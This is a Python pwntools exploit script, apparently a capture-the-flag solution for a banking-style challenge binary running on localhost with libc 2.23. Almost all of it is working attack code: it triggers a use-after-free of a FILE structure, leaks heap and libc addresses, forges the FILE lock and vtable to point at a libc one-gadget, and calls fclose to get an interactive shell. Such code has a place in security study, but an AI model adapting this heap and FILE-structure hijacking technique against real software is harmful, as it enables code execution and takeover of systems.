from pwn import *
from exploit import *

p = exploit_source("./dist/manipulation.o", "nc localhost 13025")

libc = ELF("./dist/libc-2.23.so")

def add(n):
    p.sendlineafter("opt > ", "1")
    p.sendlineafter("New Size > ", str(n))

def set_name(idx, name):
    p.sendlineafter("opt > ", "2")
    p.sendlineafter("Account > ", str(idx))
    p.sendafter("Name: ", name)

def tfr(f, t, amt):
    p.sendlineafter("opt > ", "3")
    p.sendlineafter("From > ", str(f))
    p.sendlineafter("To > ", str(t))
    p.sendlineafter("Amount > ", str(amt))

def print_accounts():
    p.sendlineafter("opt > ", "4")

p.sendlineafter("Account Size > ", "10") # any number < 29

# frees the FILE structure backing the log struct
tfr(0, 0, 0.0)

# allocates our accounts array where the FILE structure used to be
add(0x1d0 // 16) # sizeof(FILE) / sizeof(account)

# leak out FILE structure, including pointers to heap
print_accounts()

p.recvuntil("10. ")
p.recvuntil(": ")
heap_leak = u64(struct.pack("d", float(p.recvline()[:-1])))
file_struct = heap_leak - 240
info(f"{hex(heap_leak) = }")
success(f"{hex(file_struct) = }")

p.recvuntil("13. ")
io_file_jumps = u64(p.recvuntil(":")[:-1].ljust(8, b'\0'))
info(f"{hex(io_file_jumps) = }")
libc.address = io_file_jumps - libc.symbols['_IO_file_jumps']
success(f"{hex(libc.address) = }")

# set lock of file struct, that was destroyed during free+malloc
set_name(8, p64(file_struct))

set_name(7, p64(libc.address + [283174, 283258, 983908, 987655][2])) # setup vtable with _IO_finish_t = libc one gadget
set_name(13, p64(file_struct+0x68)) # overwrite vtable, point to somewhere inside the accounts

p.sendlineafter("opt > ", "5") # exit, trigger fclose

p.interactive()